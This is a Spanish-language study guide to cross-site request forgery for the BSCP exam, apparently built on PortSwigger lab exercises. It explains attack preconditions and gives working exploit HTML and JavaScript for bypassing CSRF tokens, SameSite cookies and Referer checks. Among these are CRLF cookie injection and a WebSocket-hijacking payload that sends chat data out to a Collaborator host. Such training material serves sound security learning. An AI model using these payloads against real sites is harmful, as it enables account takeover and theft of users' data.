# 🏴‍☠️ Guía Maestra: Cross-Site Request Forgery (CSRF) - BSCP

**Definición:** CSRF es una vulnerabilidad que permite a un atacante inducir a usuarios a realizar acciones que no pretenden (ej: cambiar email, contraseña, transferencias). Elude parcialmente la *Same Origin Policy*.

> **Impacto:** Si la víctima es un usuario normal, se comprometen sus datos. Si es administrador, se puede comprometer la aplicación entera.

-----

## ✅ 1. Condiciones Previas (Checklist)

Para que un ataque CSRF sea posible, deben cumplirse **tres condiciones** simultáneamente:

1.  **Una acción relevante:** Hay una acción en la aplicación que el atacante tiene motivos para inducir (ej: cambiar email, permisos).
2.  **Manejo de sesión basado en Cookies:** La aplicación depende *exclusivamente* de cookies de sesión para identificar al usuario. No hay otros mecanismos de validación.
3.  **Sin parámetros impredecibles:** La petición no contiene parámetros que el atacante no pueda adivinar (como la contraseña actual).

-----

## 🛠️ 2. Cómo construir un ataque CSRF (Burp Suite)

Manualmente es tedioso. Usa el generador de Burp Suite Professional.

1.  Selecciona la petición que quieres explotar en cualquier parte de Burp (Proxy/Repeater).
2.  Click derecho $\to$ **Engagement tools** $\to$ **Generate CSRF PoC**.
3.  Burp generará el HTML (el navegador de la víctima añadirá las cookies automáticamente).
4.  **Tip:** En "Options", activa "Auto-submit script" para que se ejecute solo.
5.  Copia el HTML y pruébalo.

**Ejemplo de HTML Básico generado:**

```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

-----

## 🛡️ 3. Bypassing CSRF Token Defenses

Las defensas más comunes son tokens CSRF, SameSite cookies y validación de Referer. Aquí veremos cómo romperlas.

### A. Cambio de método HTTP (POST $\to$ GET)

La validación del token puede estar solo en el bloque de código que maneja `POST`, pero el `GET` podría funcionar sin validación.

  * **Ataque:**
    1.  Envía la petición al Repeater.
    2.  Click derecho $\to$ **Change request method**.
    3.  Si la aplicación acepta el GET y realiza la acción sin pedir token, es vulnerable.
  * **Payload:**
    ```http
    GET /email/change?email=pwned@evil-user.net HTTP/1.1
    Host: vulnerable-website.com
    Cookie: session=...
    ```

### B. Validación depende de la presencia del token

Algunas apps validan el token *si está presente*, pero se saltan la validación si se omite.

  * **Ataque:** Borra todo el parámetro `csrf` (no solo el valor, sino el parámetro entero).
  * **Ejemplo:**
      * Original: `email=x&csrf=token`
      * Ataque: `email=x`

### C. Token no atado a la sesión (Global Pool)

La aplicación valida que el token exista en su base de datos, pero no comprueba si pertenece al usuario que hace la petición.

  * **Pasos:**
    1.  Loguéate con tu cuenta de atacante.
    2.  Intercepta una petición y obtén un token válido. **Descarta (Drop)** esa petición para no "quemar" el token.
    3.  Crea el exploit CSRF para la víctima usando **tu token**.

### D. Token atado a una Cookie (No de sesión) - `csrfKey`

La app usa una cookie `session` y otra cookie `csrfKey`. Valida que el parámetro `csrf` coincida matemáticamente con la `csrfKey`, pero no valida que la `csrfKey` pertenezca a la sesión actual.

  * **Requisito:** Necesitas un vector de "Inyección de Cookies" (ej: una búsqueda que refleje cabeceras o una vulnerabilidad CRLF).
  * **Pasos:**
    1.  Obtén una `csrfKey` y un token `csrf` válido de tu cuenta.
    2.  Busca dónde inyectar la cookie (ej: `Set-Cookie` en una búsqueda).
    3.  Inyecta la cookie `csrfKey` en la víctima y envía el formulario con el token `csrf` correspondiente.

**Código del Exploit:**

```html
<html>
  <body>
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wiener33@hacked.net" />
      <input type="hidden" name="csrf" value="TU_TOKEN_VALIDO" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=TU_KEY_VALIDA;%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

### E. Double Submit Cookie (Token duplicado)

La app no mantiene registro de tokens. Simplemente verifica: `Cookie[csrf] == Body[csrf]`.

  * **Ataque:** Al igual que el anterior, inyecta una cookie. Pero aquí **no necesitas un token válido**. Puedes inventarlo.
  * **Pasos:** Inyecta `Set-Cookie: csrf=fake` y envía en el formulario `csrf=fake`.

-----

## 🍪 4. Bypassing SameSite Cookie Restrictions

**Teoría Rápida:**

  * **Site (Sitio):** TLD+1 (ej: `example.com`). Incluye `app.example.com` y `blog.example.com`.
  * **Origin (Origen):** Esquema + Dominio + Puerto exactos.
  * **Strict:** Nunca se envía en cross-site.
  * **Lax:** Se envía en cross-site solo si es **Top-Level Navigation** (cambia la URL del navegador) y método **GET**. (Default en Chrome).

### A. Bypass Lax usando Override de Método

Si la cookie es `Lax`, un POST cross-site fallará. Un GET funcionará (top-level), pero la acción suele requerir POST. Muchos frameworks permiten simular POST sobre GET.

  * **Técnica:**
    1.  Cambia el método a GET.
    2.  Añade el parámetro `_method=POST` (u otros específicos del framework).
  * **Código:**

<!-- end list -->

```html
<script>
document.location = "https://LAB-ID.web-security-academy.net/my-account/change-email?email=hacked@user.net&_method=POST";
</script>
```

### B. Bypass Strict usando On-Site Gadgets (Redirección)

Si es `Strict`, el ataque debe originarse desde el **mismo sitio**. Buscamos una redirección del lado del cliente (Client-Side Redirect) dentro de la propia web.

  * **Gadget:** Una funcionalidad que redirige basándose en un parámetro (ej: confirmación de comentario).
  * **Ataque:** La víctima visita el enlace de redirección $\to$ La web la redirige internamente a la acción vulnerable $\to$ Como es interno, la cookie Strict se envía.

**Código (Path Traversal en Redirect):**

```html
<script>
// Fíjate en codificar el & como %26 para que no corte la URL principal
document.location = "https://LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hacked%40net&submit=1";
</script>
```

### C. Bypass Strict mediante Sibling Domains (CSWSH + XSS)

Si tienes un XSS en un subdominio "hermano" (`blog.site.com`), puedes atacar la app principal (`app.site.com`) porque son el mismo "Site".

  * **Caso WebSockets:** Usar Cross-Site WebSocket Hijacking desde el XSS para robar sesión o actuar.
  * **Pasos:**
    1.  Detecta el handshake WebSocket (busca el mensaje que inicia la comunicación "READY").
    2.  Encuentra un XSS en subdominio (ej: búsqueda reflejada `https://cms-0af000b804cf4db182c3081300720026.web-security-academy.net`).
    3.  Crea el payload JS, codifícalo y mételo en el XSS (`https://cms-0af000b804cf4db182c3081300720026.web-security-academy.net/login?username=+%3Cscript%3Ealert%281%29%3C%2Fscript%3E+&password=S`).

**Payload JS (CSWSH):**

```javascript
<script>
    var ws = new WebSocket('wss://LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        // Exfiltrar datos al collaborator de BURP SUITE
        fetch('https://COLLABORATOR.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

Metemos el Payload en el XSS

```javascript
<script>
  document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=PAYLOAD_JS_CODIFICADO&password=anything";
</script>
```

> **Nota:** Codifica este script (URL Encode) e inyéctalo en el parámetro vulnerable del subdominio.

### D. Bypass Lax con Cookies Nuevas (Ventana de 2 min)

Chrome permite cookies `Lax` en POSTs durante los primeros 120 segundos tras su creación (para soporte SSO).

  * **Estrategia:** Forzar renovación de cookie (ej: login social) y atacar inmediatamente.
  * **Reto:** Los popups se bloquean.
  * **Solución:** Usar `window.onclick` para que el popup sea legítimo.

**Código Completo:**

```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>

<p>Click anywhere on the page</p>

<script>
    window.onclick = () => {
        // 1. Abrir login en ventana nueva (Refresca cookie)
        window.open('https://LAB-ID.web-security-academy.net/social-login');

        // 2. Esperar 5 segundos a que se complete el login
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        // 3. Enviar POST (Permitido por cookie fresca < 2 min)
        document.forms[0].submit();
    }
</script>
```

-----

## 🔗 5. Bypassing Referer-based Defenses

Algunas apps confían en la cabecera `Referer`.

### A. Validación depende de la presencia

Si la app permite peticiones *sin* Referer, usa esta etiqueta en tu exploit para suprimirla:

```html
<meta name="referrer" content="no-referrer">
```

### B. Validación débil (Regex permisiva)

  * **Contiene dominio:** Si valida que `referer` contenga `target.com`:
      * Usa Query String: `attacker.com/csrf?target.com`
      * **Importante:** Debes añadir el header `Referrer-Policy: unsafe-url` en tu servidor de exploit para que envíe los argumentos de la URL.
  * **Subdominio:** Si valida que termine en `target.com`:
      * Usa subdominio: `target.com.attacker.com`.

**Snippet completo (con manipulación de historial):**

```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="hacked@hacked.com"/>
  <input type="submit" value="submit"/>
</form>
<script>
  // Manipula la URL para engañar visualmente o cumplir requisitos
  history.pushState("", "", "/?LAB-ID.web-security-academy.net")
  document.forms[0].submit();
</script>
```

### 📝 Resumen Rápido para el Examen BSCP

1.  **Check CSRF Token:** ¿Falta? ¿Cambiar a GET lo rompe? ¿Puedo usar mi propio token?
2.  **Check SameSite:**
      * ¿Es `None`? Ataque estándar.
      * ¿Es `Lax`? Intenta GET con `_method` o busca redirecciones.
      * ¿Es `Lax` (por defecto)? Usa el truco de los 2 minutos (Refresh cookie + Attack).
      * ¿Es `Strict`? Busca redirecciones internas o XSS en subdominios.
3.  **Check Referer:** Intenta borrarlo con la etiqueta meta.
